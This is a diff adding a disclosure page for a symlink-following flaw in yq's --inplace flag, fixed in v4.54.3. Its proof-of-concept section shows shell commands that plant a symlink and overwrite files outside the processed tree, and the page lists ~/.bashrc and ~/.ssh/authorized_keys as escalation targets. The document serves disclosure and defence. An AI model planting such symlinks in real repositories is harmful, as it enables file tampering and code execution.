@@ -1,0 +1,107 @@
+---
+layout: reporte
+title: "GHSA-c3cc-5w96-mw9r — yq --inplace follows symlinks when updating (mikefarah/yq)"
+description: "Symlink following in yq ≤4.54.1 via the --inplace flag — a planted symlink transfers the in-place write to any file reachable by the yq user. CVSS 6.1 MODERATE. Fixed in v4.54.3."
+permalink: /reports/GHSA-c3cc-5w96-mw9r/
+redirect_from: /reportes/GHSA-c3cc-5w96-mw9r/
+permalink_es: /reportes/GHSA-c3cc-5w96-mw9r-es/
+---
+
+<h1><code>--inplace</code> follows symlinks when updating</h1>
+
+<div class="meta-badges">
+  <span class="badge badge-tipo">Symlink Following</span>
+  <span class="badge badge-sev-medium">CVSS 6.1 MODERATE</span>
+  <span class="badge badge-cwe">CWE-59: Improper Link Resolution Before File Access</span>
+  <span class="badge badge-id">mikefarah/yq ≤ v4.54.1</span>
+</div>
+
+<p>
+  <a href="https://github.com/mikefarah/yq/security/advisories/GHSA-c3cc-5w96-mw9r">GHSA-c3cc-5w96-mw9r</a> · CVE assignment pending
+</p>
+
+<h2>Summary</h2>
+
+<p>When writing with <code>-i</code> / <code>--inplace</code>, yq resolves and follows symlinks instead of replacing them. A symlink planted in the tree being processed (e.g. in a PR, a shared config repo, or a downloaded project) transfers the in-place write to any file reachable by the yq user — the victim file gets overwritten with the attacker-controlled processed document. This diverges from the ecosystem default (<code>sed -i</code> replaces the symlink), is not opt-out, and is not documented anywhere.</p>
+
+<h2>Impact</h2>
+
+<ul>
+  <li><strong>Clobber via planted symlink</strong> — overwrite of operator files with attacker-controlled content at any path reachable by the yq user.</li>
+  <li><strong>Attack vector:</strong> local — a malicious <code>.yml</code>/<code>.yaml</code> symlink inside a processed repository or config tree; no privilege boundary crossed (the write runs with the yq user's own privileges, but the file choice and content are attacker-controlled).</li>
+  <li><strong>Escalation:</strong> overwriting dotfiles, scripts, or workflow definitions (<code>~/.bashrc</code>, <code>~/.ssh/authorized_keys</code>, <code>.github/workflows/*.yml</code>, crontab) leads to code execution on the next run; critical files can also be corrupted.</li>
+</ul>
+
+<h2>Root Cause</h2>
+
+<p><code>pkg/yqlib/file_utils.go:10-17</code> (<code>tryRenameFile</code>): the symlink branch is intentional — when writing in-place, yq resolves and follows the symlink, writing the processed content through it. There is no opt-out flag, no warning in the flag help, and no documentation of the risk.</p>
+
+<pre><code class="language-go">// pkg/yqlib/file_utils.go:10-17 — tryRenameFile
+// Symlink branch: yq follows the link instead of replacing it
+// (sed -i replaces the symlink; yq writes through it)
+</code></pre>
+
+<p>Behavioral divergence: <code>sed -i</code> replaces the symlink with a new regular file (breaking the link, protecting the victim file); <code>sponge</code> and <code>ex</code> follow symlinks like yq — but those tools' behaviors are known and documented, whereas yq neither documents nor guards its choice. The advisory also lists CWE-22 and CWE-73 (external control of file name or path) as related weaknesses.</p>
+
+<h2>Proof of Concept</h2>
+
+<p>Tested against yq v4.54.1 (commit <code>504fc38780cc46be8444ea1b72fb55919fc0bfb0</code>), binary built from the tagged source. 3 screenshots attached to the advisory.</p>
+
+<pre><code class="language-bash"># Clobber through a symlink (working dir /tmp/yq-vn044/)
+$ ls -la
+[lrwxrwxrwx  link.yml -> victim.txt
+ -rw-rw-r--  victim.txt]
+
+$ cat victim.txt
+[app: production
+ key: SECRET_VALUE]
+
+$ ./yq -i '.key = "PWNED_BY_YQ"' link.yml
+[exit 0]
+
+$ ls -la
+[lrwxrwxrwx  link.yml -> victim.txt]      ← SYMLINK STILL A SYMLINK (yq followed it)
+
+$ cat victim.txt
+[app: production
+ key: PWNED_BY_YQ]                        ← REAL FILE OVERWRITTEN THROUGH THE SYMLINK
+
+# Planted symlink pointing outside the processed tree
+$ ln -s ../outside2/important.yml repo/ci-config.yml
+$ ./yq -i '.db_password = "PWNED"' repo/ci-config.yml
+[exit 0]
+$ cat outside2/important.yml
+[db_password: PWNED]                      ← OVERWRITTEN OUTSIDE THE REPO TREE
+
+# Contrast with sed -i (ecosystem default: replace, don't follow)
+$ sed -i 's/SECRET_VALUE/PWNED_BY_SED/' link2.yml
+$ ls -la link2.yml victim2.txt
+[-rw-rw-r--  link2.yml]                   ← SYMLINK DESTROYED, REPLACED BY A REGULAR FILE
+$ cat victim2.txt
+[app: production
+ key: SECRET_VALUE]                       ← VICTIM INTACT
+</code></pre>
+
+<h2>Disclosure Timeline</h2>
+
+<table>
+  <thead><tr><th>Date</th><th>Event</th></tr></thead>
+  <tbody>
+    <tr><td>2026-10-23</td><td>Reported as Issue B of the combined advisory GHSA-c3cc-5w96-mw9r (together with the <code>--split-exp</code> issue); accepted by the maintainer the same day</td></tr>
+    <tr><td>2026-11-05</td><td>Issue A moved to the standalone GHSA-9fvq-9qj8-6qhx; this advisory scoped to <code>--inplace</code> only</td></tr>
+    <tr><td>2026-11-09</td><td>Advisory published; fix released in yq v4.54.3</td></tr>
+    <tr><td>Pending</td><td>CVE assignment (request due now that a fix is public)</td></tr>
+  </tbody>
+</table>
+
+<h2>Fix</h2>
+
+<p>yq v4.54.3 replaces symlinks instead of writing through them:</p>
+
+<pre><code class="language-text">- Fixed `--inplace` to reject direct updates to read-only files and replace
+  symbolic links instead of modifying their targets. (#2973)
+</code></pre>
+
+<p>The advisory also suggests a default-safe design (replace symlinks as <code>sed -i</code> does) or an explicit <code>--preserve-symlinks</code> opt-in flag with a warning in the help and docs. Workaround on vulnerable versions: do not run <code>yq -i</code> over trees containing untrusted symlinks (process a copy, or pre-resolve/remove symlinks).</p>
+
+<p><em>Fixed in yq v4.54.3 (2026-11-09). Advisory published 2026-11-09; CVE assignment pending.</em></p>
